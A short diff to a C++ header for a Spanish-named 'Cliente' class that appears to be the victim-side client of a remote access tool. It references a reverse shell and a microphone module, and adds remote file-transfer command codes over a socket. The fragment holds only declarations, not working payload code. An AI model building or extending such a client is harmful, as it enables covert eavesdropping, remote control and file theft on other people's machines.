@@ -19,6 +19,9 @@ class Cliente {
 
 		ReverseShell* reverseSHELL = nullptr;
 		Mod_Mic* mod_Mic = nullptr;
+
+		//Para recibir archivo (single)
+		FILE *fpArchivo = nullptr;
 		
 	public:
 		SOCKET sckSocket = INVALID_SOCKET;
@@ -40,6 +43,8 @@ class Cliente {
 			{"515", EnumComandos::FM_Crear_Archivo},
 			{"516", EnumComandos::FM_Borrar_Archivo},
 			{"517", EnumComandos::FM_Descargar_Archivo},
+			{"518", EnumComandos::FM_Descargar_Archivo_Recibir},
+			{"519", EnumComandos::FM_Descargar_Archivo_Init},
 			{"520", EnumComandos::FM_Descargar_Archivo_End}
 
 		};
@@ -72,7 +77,7 @@ class Cliente {
 
 		void MainLoop();
 
-		void ProcesarComando(std::vector<std::string> strIn);
+		void ProcesarComando(char* pBuffer, int iSize);
 
 };
 
